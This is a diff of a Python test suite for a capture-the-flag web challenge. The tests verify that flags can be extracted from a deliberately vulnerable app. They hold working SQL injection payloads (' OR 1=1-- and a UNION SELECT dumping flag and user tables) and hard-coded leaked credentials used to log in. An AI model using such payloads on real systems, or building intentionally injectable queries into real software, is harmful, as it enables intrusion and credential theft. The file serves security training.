@@ -1,4 +1,4 @@
-"""Comprehensive automated test for Aethelgard Archipelago CTF Application."""
+"""Automated test suite for Aethelgard Declassified Archives CTF."""
 import sys
 from pathlib import Path
 from starlette.testclient import TestClient
@@ -17,7 +17,7 @@ def run_tests():
     print("\n[1] Testing GET / & Reconnaissance Header (Flag 1)...")
     res = client.get("/")
     assert res.status_code == 200, f"Expected 200, got {res.status_code}"
-    assert "AETHELGARD ARCHIVES" in res.text
+    assert "AETHELGARD" in res.text
     assert "X-Archipelago-Node" in res.headers, "Header X-Archipelago-Node missing!"
     flag1 = res.headers["X-Archipelago-Node"]
     print(f"    [+] Found Flag 1 Header: {flag1}")
@@ -27,36 +27,34 @@ def run_tests():
     print("\n[2] Testing GET /robots.txt...")
     res = client.get("/robots.txt")
     assert res.status_code == 200
-    assert "Disallow: /mail/" in res.text
-    assert "Disallow: /flights/" in res.text
     assert "Disallow: /photos/" in res.text
-    print("    [+] robots.txt contains expected hidden compartments.")
+    print("    [+] robots.txt contains expected hidden paths.")
     
-    # 3. Test /mail & Flag 4 (Executive Correspondence)
-    print("\n[3] Testing GET /mail & Flag 4...")
-    res = client.get("/mail")
+    # 3. Test Flag 4 (Executive Coordinates & Leaked Memo)
+    print("\n[3] Testing Archive Search for Flag 4...")
+    res = client.get("/")
     assert res.status_code == 200
-    assert "Leaked Correspondence" in res.text
     assert "flag{pr1v4t3_m41l_c00rd1n4t3s_3xfl1tr4t3d_44b1}" in res.text
-    print("    [+] Leaked mails render cleanly with Flag 4 coordinates.")
+    assert "36.4523N" in res.text and "28.1876E" in res.text
+    print("    [+] Leaked coordinates memo and Flag 4 confirmed.")
     
-    # 4. Test SQL Injection on /mail (Flag 2 Extraction)
-    print("\n[4] Testing SQL Injection on /mail (Flag 2)...")
-    sqli_payload = "' UNION SELECT 1, 'flag', flag_name, flag_value, 'FLAG', '2026', 'admin' FROM system_flags--"
-    res = client.get(f"/mail?q={sqli_payload}")
+    # 4. Test Alternative 1: Classic ' OR 1=1-- Search Trick for Flag 2 & Credentials
+    print("\n[4] Testing Classic ' OR 1=1-- Search Trick (Flag 2)...")
+    res = client.get("/?q=' OR 1=1--")
     assert res.status_code == 200
-    assert "FLAG_2_DATABASE" in res.text
+    assert "FLAG 2:" in res.text
     assert "flag{sql1_3xtr4ct_v4nc3_cr3d3nt14ls_77d2}" in res.text
-    print("    [+] SQL Injection successfully dumped system_flags table (Flag 2 verified).")
-    
-    # 5. Test SQL Injection user dump
-    print("\n[5] Testing SQL Injection user dump...")
-    sqli_user_payload = "' UNION SELECT 1, 'user', username, password_hash, role, '2026', 'admin' FROM users--"
-    res = client.get(f"/mail?q={sqli_user_payload}")
-    assert res.status_code == 200
     assert "d.mercer" in res.text
-    assert "$2b$12$" in res.text
-    print("    [+] User bcrypt hash successfully extracted via SQLi.")
+    assert "telecom2019" in res.text
+    print("    [+] ' OR 1=1-- successfully unlocked Flag 2 and credentials (d.mercer / telecom2019).")
+    
+    # 5. Test UNION SQLi as well (Backwards-compatible)
+    print("\n[5] Testing Advanced UNION SQL Injection...")
+    sqli_payload = "' UNION SELECT 1, 'flag', flag_name, flag_value, 'FLAG', '2026', 'admin' FROM system_flags--"
+    res = client.get(f"/?q={sqli_payload}")
+    assert res.status_code == 200
+    assert "flag{sql1_3xtr4ct_v4nc3_cr3d3nt14ls_77d2}" in res.text
+    print("    [+] UNION SELECT query successfully dumped flags.")
 
     # 6. Test /flights (Private Aviation Registry)
     print("\n[6] Testing GET /flights...")
@@ -66,23 +64,24 @@ def run_tests():
     assert "Site Bravo Private Runway" in res.text
     print("    [+] Private aviation registry rendered.")
 
-    # 7. Test /photos (Classified Media Vault & Flag 5)
-    print("\n[7] Testing GET /photos (Flag 5)...")
+    # 7. Test /photos Locked Gate (Requires Username & Password)
+    print("\n[7] Testing /photos locked gate without credentials...")
     res = client.get("/photos")
     assert res.status_code == 200
-    assert "SURVEILLANCE: Site Bravo Private Island Estate" in res.text
-    assert "flag{cl4ss1f13d_fl1ght_m4n1f3st_v4ult_55f9}" in res.text
-    print("    [+] Classified media vault and Flag 5 verified.")
+    assert "Clearance Required" in res.text or "Restricted Surveillance Vault" in res.text
+    assert "SIGN IN TO UNLOCK EVIDENCE" in res.text
+    print("    [+] Unauthenticated users are properly blocked from viewing photos.")
 
-    # 8. Test Authentication & Dashboard
-    print("\n[8] Testing /login and /dashboard...")
-    login_res = client.post("/login", data={"username": "d.mercer", "password": "telecom2019", "next": "/dashboard"})
+    # 8. Test Logging In and Unlocking /photos (Flag 5)
+    print("\n[8] Testing /login and accessing /photos with credentials (Flag 5)...")
+    login_res = client.post("/login", data={"username": "d.mercer", "password": "telecom2019", "next": "/photos"})
     assert login_res.status_code in (200, 302, 303)
-    dash_res = client.get("/dashboard")
-    assert dash_res.status_code == 200
-    assert "Executive Management Console" in dash_res.text
-    assert "flag{r00t_m4st3r_4rch1p3l4g0_0wn3d_993c}" in dash_res.text
-    print("    [+] Dashboard authenticated session and Flag 3 verified.")
+    
+    photos_res = client.get("/photos")
+    assert photos_res.status_code == 200
+    assert "Surveillance Evidence Vault" in photos_res.text
+    assert "flag{cl4ss1f13d_fl1ght_m4n1f3st_v4ult_55f9}" in photos_res.text
+    print("    [+] Logged-in user successfully unlocked photos gallery and retrieved Flag 5!")
 
     print("\n=======================================================")
     print(">>> ALL 8 CTF FUNCTIONAL & SECURITY TESTS PASSED! <<<")
